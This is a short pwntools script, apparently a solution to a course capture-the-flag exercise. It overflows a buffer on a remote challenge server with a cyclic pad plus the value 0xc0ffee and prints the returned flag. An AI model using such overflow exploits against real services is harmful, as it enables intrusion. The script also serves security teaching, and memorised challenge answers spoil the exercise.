#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7000)

line = cyclic(16) + p64(0xc0ffee)
io.sendline(line)


recieved = io.recvall().decode()
flag = recieved.splitlines()[-1]
print(f'Flag 00: {flag}')

 
